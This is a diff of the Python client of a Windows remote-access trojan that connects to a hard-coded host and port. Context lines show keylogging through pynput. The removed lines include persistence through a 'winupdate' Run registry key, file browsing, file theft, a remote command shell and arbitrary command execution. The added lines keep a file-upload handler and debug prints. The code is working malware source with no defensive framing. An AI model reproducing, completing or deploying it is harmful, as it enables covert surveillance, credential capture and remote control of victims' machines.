@@ -6,7 +6,7 @@ from winreg import *
 
 strHost = "10.5.29.45"
 # strHost = socket.gethostbyname("")
-intPort = 5888
+intPort = 5688
 
 strPath = os.path.realpath(sys.argv[0])  # get file path
 TMP = os.environ["TEMP"]  # get temp path
@@ -19,23 +19,21 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     sys.exit(0)
 
+# function to return decoded utf-8
+decode_utf8 = lambda data: data.decode("utf-8")
 
-def connect_socket():
-    while True:  # infinite loop until socket can connect
-        try:
-            global objSocket
-            objSocket = socket.socket()
-            objSocket.connect((strHost, intPort))
-        except socket.error:
-            time.sleep(5)  # wait 5 seconds to try again
-        else: break
+def create_socket():
+    global objSocket 
+    try:
+        objSocket = socket.socket()
+        objSocket.connect((strHost, intPort))
+        execute_command()
+    except socket.error:
+        return
 
     strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
     objSocket.send(str.encode(strUserInfo))
     del strUserInfo  # delete data after it has been sent
-
-# function to return decoded utf-8
-decode_utf8 = lambda data: data.decode("utf-8")
 
 
 def OnKeyboardEvent(event):
@@ -64,7 +62,7 @@ KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
 Key = pynput.keyboard.Key
 
 
-def recvall(buffer):  # function to receive large amounts of data
+def recvall(buffer,objSocket):  # function to receive large amounts of data
     bytData = b""
     while True:
         bytPart = objSocket.recv(buffer)
@@ -74,153 +72,37 @@ def recvall(buffer):  # function to receive large amounts of data
         if len(bytData) == buffer:
             return bytData
 
-
-def startup():
-    try:
-        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
-        copyfile(strPath, strAppPath)
-
-        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
-        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
-    except WindowsError:
-        objSocket.send(str.encode("Unable to add to startup!"))
-    else:
-        objSocket.send(str.encode("success"))
-
-
-
-def file_browser():
-    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
-    arrRawDrives = arrRawDrives.split('\000')[:-1]
-
-    strDrives = ""
-    for drive in arrRawDrives:  # get proper view and place array into string
-        strDrives += drive.replace("\\", "") + "\n"
-    objSocket.send(str.encode(strDrives))
-
-    strDir = decode_utf8(objSocket.recv(1024))
-
-    if os.path.isdir(strDir):
-        arrFiles = os.listdir(strDir)
-
-        strFiles = ""
-        for file in arrFiles:
-            strFiles += (file + "\n")
-
-        objSocket.send(str.encode(str(len(strFiles))))  # send buffer size
-        time.sleep(0.1)
-        objSocket.send(str.encode(strFiles))
-
-    else:  # if the user entered an invalid directory
-        objSocket.send(str.encode("Invalid Directory!"))
-        return
-
-
 def upload(data):
     intBuffer = int(data)
-    file_data = recvall(intBuffer)
+    file_data = recvall(intBuffer,objSocket)
     strOutputFile = decode_utf8(objSocket.recv(1024))
-    print ("I am here befor try")
     try:
         objFile = open(strOutputFile, "wb")
         objFile.write(file_data)
-        print ("I am here 1")
         objFile.close()
-        print ("I am here 2")
         objSocket.send(str.encode("Done!!!"))
     except:
         objSocket.send(str.encode("Path is protected/invalid!"))
 
-    # objSocket.close()
-
-
-def receive(data):
-    if not os.path.isfile(data):
-        objSocket.send(str.encode("Target file not found!"))
-        return
-
-    objSocket.send(str.encode("File size: " + str(os.path.getsize(data))
-                              + " bytes" + "\n" + "Please wait..."))
-    objFile = open(data, "rb")  # send file contents and close the file
-    time.sleep(1)
-    objSocket.send(objFile.read())
-    objFile.close()
-
-
-def command_shell():
-    strCurrentDir = str(os.getcwd())
-
-    objSocket.send(str.encode(strCurrentDir))
-
-    while True:
-        strData = decode_utf8(objSocket.recv(1024))
-
-        if strData == "goback":
-            os.chdir(strCurrentDir)  # change directory back to original
-            break
-
-        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
-            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
-                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
-                os.chdir(strOutput)  # change directory
-
-                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server
-
-        elif len(strData) > 0:
-            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it
-
-            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")
-        else:
-            bytData = str.encode("Error!!!")
-
-        strBuffer = str(len(bytData))
-        objSocket.send(str.encode(strBuffer))  # send buffer size
-        time.sleep(0.1)
-        objSocket.send(bytData)  # send output
-
-
-def run_command(command):
-    strLogOutput = "\n"
-
-    if len(command) > 0:
-        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="ignore")
-    else:
-        strLogOutput += "Error!!!"
-
-    bytData = str.encode(strLogOutput)
-
-    strBuffer = str(len(bytData))
-    objSocket.send(str.encode(strBuffer))  # send buffer size
-    time.sleep(0.1)
-    objSocket.send(bytData)  # send output
+    print (objSocket)
+    objSocket.close()
+    print (objSocket)
+    time.sleep(5)
+    # sys.exit(0)
 
 
 def execute_command():
     # try:
     strData = objSocket.recv(1024)
     strData = decode_utf8(strData)
-    print (strData + "here")
     if strData == "exit":
         objSocket.close()
         sys.exit(0)
-    elif strData[:4] == "site":
-        webbrowser.get().open(strData[4:])
-    elif strData == "startup":
-        startup()
-    elif strData == "filebrowser":
-        file_browser()
     elif strData[:4] == "send":
-        print ("I am here in send")
         upload(strData[4:])
-    elif strData[:4] == "recv":
-        receive(strData[4:])
-    elif strData == "cmd":
-        command_shell()
-    elif strData[:6] == "runcmd":
-        run_command(strData[6:])
     # except socket.error:  # if the server closes without warning
     #     objSocket.close()
     #     sys.exit(0)
+
+
+# create_socket()
